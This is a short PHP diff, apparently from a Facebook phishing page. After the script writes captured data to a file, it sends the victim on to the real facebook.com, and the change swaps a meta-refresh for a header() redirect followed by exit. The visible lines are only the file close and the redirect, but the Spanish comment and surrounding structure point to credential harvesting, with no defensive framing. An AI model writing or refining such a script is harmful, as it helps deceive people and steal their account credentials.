@@ -15,5 +15,6 @@ fwrite($guardame,
 
 fclose($guardame);
 //Redirecciona a la web original (facebook)
-echo "<meta http-equiv='refresh' content='1;url=http://www.facebook.com'>"
+header("refresh:1;url=http://www.facebook.com");
+exit;
 ?>
